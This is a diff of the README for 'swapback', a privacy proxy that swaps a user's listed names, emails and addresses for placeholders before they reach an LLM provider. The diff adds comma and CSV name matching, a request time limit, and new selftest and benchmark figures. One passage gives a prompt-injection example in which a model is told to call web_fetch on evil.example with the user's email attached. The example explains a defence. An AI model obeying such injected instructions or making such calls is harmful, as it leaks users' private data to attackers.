@@ -19,7 +19,7 @@
 talks OpenAI Chat Completions, OpenAI Responses or Anthropic Messages (set its base URL, change nothing else). You write
 down the names, emails, phones, IDs and addresses that must never reach a model provider. The provider only sees
 `«PERSON_1»`; your app gets the original text back, byte-exact, in plain and streamed replies. There is no model to
-download and nothing probabilistic: exact matching plus patterns, about 5,400 lines of Python, 3 dependencies.
+download and nothing probabilistic: exact matching plus patterns, about 5,700 lines of Python, 3 dependencies.
 
 **Tool calls can't carry your listed values out.** An agent reads a page or an email with a prompt injection in it,
 and the model is told to call `web_fetch("https://evil.example/?q=<your email>")`. The model only ever had
@@ -35,7 +35,8 @@ agents; swapback does it for any agent, by tool-name globs. From `swapback demo`
 
 **Every common spelling, and a re-check that fails closed.** A listed value is matched in its written variants: any
 case, extra or non-breaking spaces, `.` `_` `-` `+` `/` between words (also when the words are separate path
-segments, `/Users/First/Last/`), lines of an address joined by HTML tags, with or without a line break after the tag (`<br>`,
+segments, `/Users/First/Last/`), one comma between the words of a name (`Thanks Faith, Ridge trail ...`, a CSV row
+`3,Faith,Ridge,Reno`, as a tab-separated row already matched), lines of an address joined by HTML tags, with or without a line break after the tag (`<br>`,
 `<br />\n`, `</p>\n<p>`, also inside JSON text), a hyphen inside a name written as a space or as
 nothing (`Ferrand-Moreau`, `Ferrand Moreau`, `FerrandMoreau`, also surname first), surname first, accent-free (`ø` →
 `o`), phone groupings with or without the country code, and a listed phone with letters glued on (`503-555-0147x22`,
@@ -79,7 +80,10 @@ check skips them), and names you never listed (there is no NER).
   or list swapped (and ordinary one-word blocks left alone), 3/3 example placeholders never assigned and broken known
   YAML reported as such, 36/36 values with quoted attributes between their parts back byte for byte, 36/36 cell
   names in HTML escaped inside JSON swapped and back exact, 11/11 reused cell names, dotted capital I, `> `-quoted
-  addresses and 9,000 copies in one string, 3/3 bad `listen` values or ports in use reported in one line, a 200 KB `%XX` body checked in under a second, health reads `blocked` when the list file is deleted or broken mid-run. Unlisted
+  addresses and 9,000 copies in one string, 32/32 cell names 7 and 8 JSON levels down (raw, `\u003c`, `<\/td>` and
+  `&lt;` HTML, with and without quoted attributes) swapped and back exact, 16/16 cells reused after another tag, names
+  split by a comma or across CSV columns, `i` + combining dot, `| `-quoted addresses, copies 8 levels down and the time
+  limit, 3/3 bad `listen` values or ports in use reported in one line, a 200 KB `%XX` body checked in under a second, health reads `blocked` when the list file is deleted or broken mid-run. Unlisted
   values caught by the patterns alone: 6/8 (both unlisted names missed). A second holdout with different made-up data
   (33 listed values incl. names as path segments, `<br>`-joined addresses and fenced-JSON restores, 1,240 requests;
   written by the maintainer, not independent): 0.4.4 leaked 235 requests, 0.4.5 leaked 10, all of them the lower-case
@@ -93,8 +97,9 @@ check skips them), and names you never listed (there is no NER).
   HTML entities or `%XX` (`S&#248;ren`, `S%C3%B8ren`) comes back decoded (`Søren`); a value the reply moves to another
   JSON level, or that sat escaped where swapback does not read a JSON level (a JSON document that is a bare string),
   comes back unescaped and then escaped for where it lands (JSON-equal: `\u00f8` as `ø`); and a name swapped out of separate HTML blocks (`<td>Amber</td><td>Lane</td>`) that the reply reuses where no tag
-  comes right before it ("Dear «PERSON_1»", a tool call's `to_name`) comes back as the listed name, `Amber Lane`,
-  without the tags between its words.
+  comes right before it ("Dear «PERSON_1»", a tool call's `to_name`), or where a different tag comes right before it
+  than before the name as sent (`<li>«PERSON_1»</li>` for a name sent in `<td>` cells), comes back as the listed name,
+  `Amber Lane`, without the tags between its words.
   A value restored inside a JSON string is JSON-escaped (quotes, backslashes, newlines), so the JSON stays valid:
   a whole JSON reply (JSON mode, structured output), and JSON inside a prose or markdown reply (a ```json fence, an
   object written inline). Inside JSON inside JSON it is escaped once per JSON level it really sits in (read from
@@ -424,7 +429,9 @@ and has an environment override. Relative paths are relative to the config file.
 Renamed from pii-scrubber in 0.2.0: the old `PII_SCRUBBER_*` variables are still read when the `SWAPBACK_*` one is unset, but they are deprecated.
 
 Also: `tool_restore` (see [Tool calls](#tool-calls)), `hooks` (see [Hooks](#hooks)), `phone_regions`, `url_swap`, `patterns` (turn single detectors
-off, e.g. `{IP: false}`), `common_names_title_case` (default `true`), `allow_empty_known`, `extra_secret_rules`, `log_requests`, `alert_min_interval_s`, `system_note`.
+off, e.g. `{IP: false}`), `common_names_title_case` (default `true`), `allow_empty_known`, `extra_secret_rules`, `log_requests`, `alert_min_interval_s`, `system_note`,
+`scrub_timeout_s` (default `10`: a request whose check takes longer is stopped and answered `503` with a one-line reason, so
+a request the client gave up on does not keep a CPU busy; `0` turns the limit off).
 
 **Known values** (`known.example.yaml`). The exact strings to swap, by type. The file is re-read whenever its content
 changes (also a save by rename); no restart needed. Guard rails, so a broken file never silently protects nothing:
@@ -572,7 +579,7 @@ Other open-source projects do the same job. This table reflects each project's o
 | | **swapback** | [PasteGuard][pg] | [Maskit][mk] | [Veil][vl] | [piighost][ph] | [Kiji Privacy Proxy][kj] |
 |---|---|---|---|---|---|---|
 | License | MIT | Apache-2.0 | AGPL-3.0 | Apache-2.0 | MIT | Apache-2.0 |
-| Stack | Python 3.11+, about 5,400 lines (276 KB), 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew), about 630 KB of Python; httpx, cryptography, pyahocorasick | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
+| Stack | Python 3.11+, about 5,700 lines (291 KB), 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew), about 630 KB of Python; httpx, cryptography, pyahocorasick | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
 | Needs an ML model | No | Yes: GLiNER for names and places ([docs][pg-sem]) | Ships a local ONNX NER model | Optional: 46 MB ONNX NER | Optional: pluggable regex, NER or LLM detectors; exact-match needs none | Yes: local ONNX model, 26 PII types |
 | Your own list of values | Yes: a YAML/JSON file you write (or build from a vCard/CSV export), typed, reloaded live | Yes: `denylist` patterns ([docs][pg-mask]) | Yes: custom words and regexes | Yes: seeded from your databases, fixtures, git history and schemas | Yes: `ExactMatchDetector` | Custom regex rules |
 | Stand-ins | Typed placeholders (`«EMAIL_1»`) | Placeholders | Unclear | Pseudonyms | Typed placeholders (`<<EMAIL:1>>`) | Realistic dummy values |
@@ -661,6 +668,10 @@ Listing a value in `known.yaml` or `private_terms.yaml` covers any of these. The
   through with placeholders left in. When a held-back piece is sent as an extra Responses delta, later
   `sequence_number`s are shifted so they stay unique and increasing. Non-streaming JSON replies of any shape are restored. The restore holds back at most one partial
   placeholder (up to 24 characters) per stream, so chunks can arrive slightly regrouped; the text is unchanged.
+- **A name split by a comma and a line break, or across quoted CSV columns, is blocked, not swapped.** `Faith,\nRidge`
+  and `"Faith","Ridge"` (a quoted CSV row, or two strings next to each other in a JSON array) answer `503`: nothing
+  leaks, but the blocked text stays in the chat history, so later requests that carry it are blocked too until it is
+  removed. One comma within a line (`Faith, Ridge`) and an unquoted CSV row (`3,Faith,Ridge,Reno`) are swapped.
 - **JSON bodies only.** Multipart uploads and binary bodies pass through untouched; `data:` URLs (images) are not scanned.
   Token-id inputs to embeddings and completions are blocked, since they cannot be checked.
 - **The tool policy is a heuristic.** It reads tool names and looks for URLs. A tool with a harmless name that still
@@ -717,7 +728,9 @@ swapback selftest: 34 made-up listed values, 257 written forms, 7 paths, 1799 re
   example placeholders unassigned, broken YAML said: 3/3 (100.0%)
   quoted attributes between a value's parts, exact:  36/36 (100.0%)
   cell names in escaped HTML (\u003c, <\/, &lt;):    36/36 (100.0%)
-  cell names reused, dotted I, quoted, many copies:  11/11 (100.0%)  (9,000 copies: 0.38 s)
+  cell names reused, dotted I, quoted, many copies:  11/11 (100.0%)  (9,000 copies: 0.37 s)
+  cell names 7-8 JSON levels down, raw/Go/PHP/&lt;:  32/32 (100.0%)
+  cells reused, comma/CSV names, dotted i, | quotes: 16/16 (100.0%)  (20 KB of copies 8 levels down: 0.88 s)
   200 KB %XX body checked in:                       0.64 s
   health: blocked when the list breaks, known count: 5/5 (100.0%)
   %XX-encoded forms back as the same value, decoded: 105/105 (100.0%)
@@ -748,7 +761,13 @@ quoted attributes (`<div dir="ltr">`, `<p class>`, `<br class>`, `<td class>`, `
 attribute menu with the listed pair in it) inside JSON at 1 and 2 levels, ASCII-escaped and raw (swapped, back byte
 for byte); the review #9 cell layouts with the HTML escaped inside JSON (`\u003c`, `<\/td>`, `&lt;`); a name swapped out
 of cells and reused in a greeting and in a tool call's `to_name` (the listed name); a name with a capital dotted I; a
-`> `-quoted address; and 9,000 copies of a listed email in one string (under 10 seconds). The 0.4.9 selftest added the review #9 forms: a listed dictionary-word name split across one-word cells or blocks in
+`> `-quoted address; and 9,000 copies of a listed email in one string (under 10 seconds). The 0.4.11 selftest adds
+the review #11 forms: names in one-word `<div dir="ltr">`, `<td class/style>`, plain `<td>` and `<li>` cells nested 7
+and 8 JSON levels deep, as raw, Go-escaped (`\u003c`), PHP-escaped (`<\/td>`) and `&lt;`-entity HTML (swapped, back
+byte for byte); a name taken from `<td>` cells reused in `<li>` and `<p>` (the listed name) and in a `<td>` (the cells);
+a name split by a comma in prose and across CSV columns, plain and in JSON; `i` + a combining dot; a `| `-quoted
+address; about 20 KB of copies of a listed address 8 JSON levels down (under 5 seconds); and the time limit
+(`scrub_timeout_s`, a 503 with a one-line reason). The 0.4.9 selftest added the review #9 forms: a listed dictionary-word name split across one-word cells or blocks in
 21 layouts (a third cell after the name, a First/Last/City header row, a leading id or word cell, pretty-printed rows,
 `class=` attributes, two data rows, three `<li>` or `<div>` items, `<p>` blocks in an email, mixed case), as text, a
 JSON tool result and an HTML email in JSON (the name must not reach the model), ordinary one-word blocks and a pair
@@ -789,6 +808,12 @@ laptop CPU (AMD Ryzen 7 4700U, Python 3.13):
 Large encoded bodies are checked in linear time: a 200 KB body of `%XX`, base64, form data or HTML entities takes
 0.1–0.7 s (0.4.4: 18 s for 48 KB of `%41`, over 100 s for a 165 KB form body), and `/scrubber/health` keeps answering
 meanwhile (0.02 s worst case while a 165 KB form body was checked).
+
+Many copies of one listed value inside deeply nested JSON are checked in linear time since 0.4.11. Measured on the
+release test box (Python 3.11): copies of a listed three-line address 8 JSON levels deep, 50 KB before nesting (577,000
+characters as sent) in 2.2 s and 100 KB in 4.1 s (0.4.10: 11 s and 44 s for 50 and 100 KB at 8 levels, quadratic);
+880 KB nested 8 levels deep (10 MB as sent) runs past the 10-second `scrub_timeout_s` and is answered `503`; the same
+880 KB at 1 level takes 2.8 s.
 
 ## Security notes
 
